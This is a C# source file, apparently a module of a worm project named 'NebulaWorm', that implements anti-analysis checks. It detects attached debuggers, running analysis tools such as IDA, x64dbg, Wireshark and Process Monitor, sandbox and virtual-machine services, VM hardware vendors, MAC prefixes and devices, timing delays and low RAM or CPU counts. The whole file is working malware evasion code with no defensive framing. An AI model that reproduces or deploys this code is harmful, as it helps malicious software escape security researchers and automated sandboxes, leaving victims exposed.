using System;
using System.Diagnostics;
using System.Linq;
using System.Management;// system management reference might be needed if u want to add this module to another project!
using System.Threading;
using Microsoft.Win32;
using System.Net.NetworkInformation;

namespace NebulaWorm
{
    internal static class AntiDebug
    {
        private static readonly string[] DebuggerProcessNames = new string[]
        {
            "ollydbg", "ida64", "ida", "idag", "idaw", "idaw64", "idaq", "idaq64",
            "wireshark", "fiddler", "x64dbg", "x32dbg", "debugger", "dbgview",
            "processhacker", "procexp", "procmon", "devenv", "ida", "dbg", "immunitydebugger"
        };

        private static readonly string[] SandboxIndicators = new string[]
        {
            "SbieSvc",     // Sandboxie service
            "VBoxService", // VirtualBox guest additions
            "vmtoolsd",    // VMware Tools
            "vmsrvc",      // VMware service
            "xenservice",  // Xen service
            "df5serv",     // Driver for Sandboxie
            "prl_cc",      // Parallels service
            "prl_tools"    // Parallels tools
        };

        private static readonly string[] VirtualMachinesManufacturers = new string[]
        {
            "microsoft corporation",
            "vmware",
            "virtualbox",
            "qemu",
            "xen",
            "parallels",
            "bhyve"
        };

        private static readonly string[] VirtualMachinesModels = new string[]
        {
            "virtual",
            "virtualbox",
            "vmware",
            "kvm",
            "bochs",
            "xen",
            "qemu",
            "parallels"
        };

        private static readonly string[] SuspiciousMacsPrefixes = new string[]
        {
            "00:05:69", // VMware
            "00:0C:29", // VMware
            "00:1C:14", // VMware
            "00:50:56", // VMware
            "08:00:27", // VirtualBox
            "0A:00:27", // VirtualBox
            "00:03:FF", // Microsoft Hyper-V, Virtual Server, Virtual PC
            "00:15:5D"  // Microsoft Hyper-V, Virtual Server, Virtual PC
        };

        public static bool IsDebuggedOrVM()
        {
            if (IsDebuggerAttached()) return true;

            if (IsDebuggerProcessRunning()) return true;

            if (IsSandboxServiceRunning()) return true;

            if (IsRunningInVM()) return true;

            if (HasDebugRegistrySet()) return true;

            if (HasDebugTimingDelay()) return true;

            if (HasSuspiciousMacAddress()) return true;

            if (HasVirtualMachineDevices()) return true;

            if (HasLowHardwareResources()) return true;

            return false;
        }

        private static bool IsDebuggerAttached()
        {
            return Debugger.IsAttached || Debugger.IsLogging();
        }

        private static bool IsDebuggerProcessRunning()
        {
            try
            {
                var processes = Process.GetProcesses();

                foreach (var proc in processes)
                {
                    string name = proc.ProcessName.ToLower();
                    if (DebuggerProcessNames.Any(dbgName => name.Contains(dbgName)))
                    {
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool IsSandboxServiceRunning()
        {
            try
            {
                var processes = Process.GetProcesses();

                foreach (var proc in processes)
                {
                    string name = proc.ProcessName.ToLower();
                    if (SandboxIndicators.Any(svc => name.Contains(svc.ToLower())))
                    {
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool IsRunningInVM()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        string manufacturer = (item["Manufacturer"] ?? "").ToString().ToLower();
                        string model = (item["Model"] ?? "").ToString().ToLower();

                        if (VirtualMachinesManufacturers.Any(vm => manufacturer.Contains(vm)) ||
                            VirtualMachinesModels.Any(vm => model.Contains(vm)))
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool HasDebugRegistrySet()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("Default");
                        if (val != null && (int)val != 0)
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool HasDebugTimingDelay()
        {
            try
            {
                var sw = Stopwatch.StartNew();
                Thread.Sleep(100);
                sw.Stop();

                if (sw.ElapsedMilliseconds > 150)
                {
                    return true;
                }
            }
            catch { }

            return false;
        }

        private static bool HasSuspiciousMacAddress()
        {
            try
            {
                var interfaces = NetworkInterface.GetAllNetworkInterfaces();

                foreach (var adapter in interfaces)
                {
                    var macAddr = adapter.GetPhysicalAddress().ToString();
                    if (string.IsNullOrEmpty(macAddr)) continue;

                    string mac = string.Join(":", Enumerable.Range(0, macAddr.Length / 2)
                        .Select(i => macAddr.Substring(i * 2, 2)));

                    if (SuspiciousMacsPrefixes.Any(prefix => mac.StartsWith(prefix, StringComparison.OrdinalIgnoreCase)))
                    {
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool HasVirtualMachineDevices()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_PnPEntity"))
                {
                    foreach (var device in searcher.Get())
                    {
                        string name = (device["Name"] ?? "").ToString().ToLower();
                        string desc = (device["Description"] ?? "").ToString().ToLower();

                        if (name.Contains("virtual") || desc.Contains("virtual") ||
                            name.Contains("vmware") || desc.Contains("vmware") ||
                            name.Contains("vbox") || desc.Contains("vbox") ||
                            name.Contains("hyper-v") || desc.Contains("hyper-v") ||
                            name.Contains("qemu") || desc.Contains("qemu"))
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool HasLowHardwareResources()
        {
            try
            {
                
                using (var searcher = new ManagementObjectSearcher("Select TotalPhysicalMemory from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        ulong ramBytes = Convert.ToUInt64(item["TotalPhysicalMemory"]);
                        ulong ramGB = ramBytes / (1024 * 1024 * 1024);

                        if (ramGB < 4) 
                            return true;
                    }
                }

               
                using (var searcher = new ManagementObjectSearcher("Select NumberOfProcessors from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        uint cpuCount = (uint)item["NumberOfProcessors"];
                        if (cpuCount < 2)
                            return true;
                    }
                }
            }
            catch { }

            return false;
        }
    }
}
